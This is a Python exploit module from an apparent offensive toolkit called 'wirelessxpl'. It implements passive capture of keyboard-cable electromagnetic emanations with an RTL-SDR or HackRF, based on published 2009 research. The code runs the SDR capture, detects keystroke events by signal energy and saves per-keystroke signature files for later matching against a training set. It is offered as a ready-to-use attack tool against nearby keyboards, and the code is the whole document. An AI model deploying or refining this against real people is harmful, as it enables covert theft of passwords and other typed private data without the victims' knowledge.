# Author: André Henrique (LinkedIn/X: @mrhenrike)
import os
import shutil
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cable/Keyboard EM Emanation Keystroke Capture.

    Captures electromagnetic emanations from USB and PS/2 keyboard
    cables to reconstruct keystrokes.  Each key press produces a
    distinct EM signature in the cable acting as an antenna.  By
    recording and analyzing these signatures with an SDR receiver
    and a magnetic loop antenna, individual keystrokes can be
    identified.

    Based on the research "Compromising Electromagnetic Emanations
    of Wired and Wireless Keyboards" (Vuagnoux & Pasini, USENIX 2009)
    and subsequent work on USB cable emanation analysis.

    Hardware necessario:
      - RTL-SDR V3 ou HackRF One como receptor SDR
      - Antena loop magnetica (diametro 5-15 cm) para campo proximo
        sintonizada em 1-30 MHz (USB) ou 10-20 MHz (PS/2)
      - Posicionamento: < 2m do cabo do teclado alvo
      - (Opcional) LNA de 20 dB para aumentar alcance
      - (Opcional) Blindagem RF para reduzir ruido ambiente

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cable/Keyboard EM Emanation Keystroke Capture",
        "description": (
            "Captures EM emanations from USB/PS2 keyboard cables to "
            "reconstruct keystrokes.  Each key produces a distinct EM "
            "signature.  Passive attack.  Hardware: RTL-SDR V3 (ou "
            "HackRF) + antena loop magnetica (5-15 cm) posicionada "
            "a menos de 2m do cabo alvo.  Opcional: LNA 20 dB."
        ),
        "authors": (
            "Vuagnoux & Pasini (USENIX 2009)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/legacy/events/sec09/tech/full_papers/vuagnoux.pdf",
            "https://doi.org/10.1145/1653662.1653666",
        ),
        "disclosure_date": "2009-08-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "USB keyboards (wired, unshielded cables)",
            "PS/2 keyboards (stronger emanations than USB)",
            "Laptop built-in keyboards (close proximity required)",
        ),
    }

    target = OptIP("", "Not used (passive EM capture)")
    port = OptPort(1, "Not used (passive EM capture)")
    timeout = OptFloat(60.0, "Capture duration in seconds")
    center_freq = OptFloat(12e6, "Center frequency in Hz (USB: ~12 MHz, PS/2: ~15 MHz)")
    sample_rate = OptFloat(2.4e6, "SDR sample rate in sps")
    gain = OptFloat(49.0, "SDR gain in dB (max for near-field)")
    sdr_device = OptString("rtlsdr", "SDR device: rtlsdr, hackrf")
    output_dir = OptString("/tmp/kb_emanation", "Output directory")
    keyboard_type = OptString("usb", "Keyboard type: usb, ps2")
    energy_threshold = OptFloat(0.15, "Energy threshold for keystroke detection (0.0-1.0)")
    min_gap_ms = OptFloat(50.0, "Minimum gap between keystrokes in ms")

    _USB_FREQ_RANGE = (1e6, 30e6)
    _PS2_FREQ_RANGE = (10e6, 20e6)

    def _find_capture_tool(self) -> str | None:
        dev = str(self.sdr_device)
        name = "rtl_sdr" if dev == "rtlsdr" else "hackrf_transfer"
        return name if shutil.which(name) else None

    def _capture_iq(self, output_file: str) -> bool:
        tool = self._find_capture_tool()
        if not tool:
            return False

        dev = str(self.sdr_device)
        if dev == "rtlsdr":
            cmd = [
                tool,
                "-f", str(int(self.center_freq)),
                "-s", str(int(self.sample_rate)),
                "-g", str(int(self.gain)),
                "-n", str(int(self.sample_rate * self.timeout)),
                output_file,
            ]
        else:
            cmd = [
                tool,
                "-r", output_file,
                "-f", str(int(self.center_freq)),
                "-s", str(int(self.sample_rate)),
                "-a", "1",
                "-l", str(int(self.gain)),
                "-n", str(int(self.sample_rate * self.timeout)),
            ]

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=self.timeout + 10)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _compute_energy(self, iq_data: bytes, window_size: int = 256) -> list[float]:
        """Compute signal energy in sliding windows."""
        energies = []
        for offset in range(0, len(iq_data) - window_size * 2, window_size * 2):
            energy = 0.0
            for i in range(window_size):
                idx = offset + i * 2
                if idx + 1 >= len(iq_data):
                    break
                real = (iq_data[idx] - 128) / 128.0
                imag = (iq_data[idx + 1] - 128) / 128.0
                energy += real * real + imag * imag
            energies.append(energy / window_size)
        return energies

    def _detect_keystrokes(self, energies: list[float]) -> list[dict]:
        """Detect keystroke events from energy profile."""
        if not energies:
            return []

        max_energy = max(energies) if energies else 1.0
        if max_energy == 0:
            max_energy = 1.0
        normalized = [e / max_energy for e in energies]

        window_duration_s = 256 / self.sample_rate
        min_gap_samples = int(self.min_gap_ms / 1000.0 / window_duration_s)

        keystrokes = []
        last_idx = -min_gap_samples - 1

        for i, e in enumerate(normalized):
            if e > self.energy_threshold and (i - last_idx) > min_gap_samples:
                time_s = i * window_duration_s
                keystrokes.append({
                    "index": i,
                    "time_s": round(time_s, 4),
                    "energy": round(e, 4),
                })
                last_idx = i

        return keystrokes

    def _extract_signature(self, iq_data: bytes, center_idx: int, window: int = 512) -> list[float]:
        """Extract the EM signature around a keystroke event for fingerprinting."""
        byte_start = max(0, center_idx * 512 - window)
        byte_end = min(len(iq_data), center_idx * 512 + window)
        chunk = iq_data[byte_start:byte_end]

        sig = []
        for i in range(0, len(chunk) - 1, 2):
            real = (chunk[i] - 128) / 128.0
            imag = (chunk[i + 1] - 128) / 128.0
            sig.append((real * real + imag * imag) ** 0.5)
        return sig

    @mute
    def check(self) -> bool:
        return self._find_capture_tool() is not None

    def run(self) -> None:
        tool = self._find_capture_tool()
        if tool is None:
            print_error(f"SDR tool for '{self.sdr_device}' not found")
            return

        kb = str(self.keyboard_type)
        if kb == "ps2":
            freq_range = self._PS2_FREQ_RANGE
        else:
            freq_range = self._USB_FREQ_RANGE

        if not (freq_range[0] <= self.center_freq <= freq_range[1]):
            print_info(
                f"Center freq {self.center_freq / 1e6:.1f} MHz is outside "
                f"typical {kb.upper()} range "
                f"({freq_range[0] / 1e6:.0f}-{freq_range[1] / 1e6:.0f} MHz)"
            )

        print_success(f"SDR tool '{tool}' found, keyboard type: {kb}")
        self._exploit()

    def _exploit(self) -> None:
        os.makedirs(str(self.output_dir), exist_ok=True)
        iq_file = os.path.join(str(self.output_dir), "kb_capture.raw")

        print_status(
            f"Capturing at {self.center_freq / 1e6:.2f} MHz for {self.timeout}s ..."
        )
        if not self._capture_iq(iq_file):
            print_error("IQ capture failed")
            return

        if not os.path.exists(iq_file):
            print_error("Capture file not created")
            return

        with open(iq_file, "rb") as f:
            iq_data = f.read()

        print_status(f"Captured {len(iq_data)} bytes, analyzing ...")

        energies = self._compute_energy(iq_data)
        keystrokes = self._detect_keystrokes(energies)

        print_status(f"Detected {len(keystrokes)} potential keystroke events")

        if keystrokes:
            log_path = os.path.join(str(self.output_dir), "keystrokes.log")
            with open(log_path, "w") as f:
                f.write("# Keystroke events detected from EM emanation\n")
                f.write("# index, time_s, energy\n")
                for ks in keystrokes:
                    f.write(f"{ks['index']}, {ks['time_s']}, {ks['energy']}\n")

            sig_dir = os.path.join(str(self.output_dir), "signatures")
            os.makedirs(sig_dir, exist_ok=True)
            for i, ks in enumerate(keystrokes[:50]):
                sig = self._extract_signature(iq_data, ks["index"])
                sig_file = os.path.join(sig_dir, f"key_{i:04d}.bin")
                with open(sig_file, "wb") as f:
                    for s in sig:
                        f.write(struct.pack("<f", s))

            print_success(
                f"Keystroke log: {log_path}\n"
                f"Signatures: {sig_dir}/ ({min(len(keystrokes), 50)} files)\n"
                "Compare signatures against a training set to identify keys."
            )
        else:
            print_info(
                "No keystrokes detected.  Try adjusting center_freq, "
                "lowering energy_threshold, or moving antenna closer."
            )
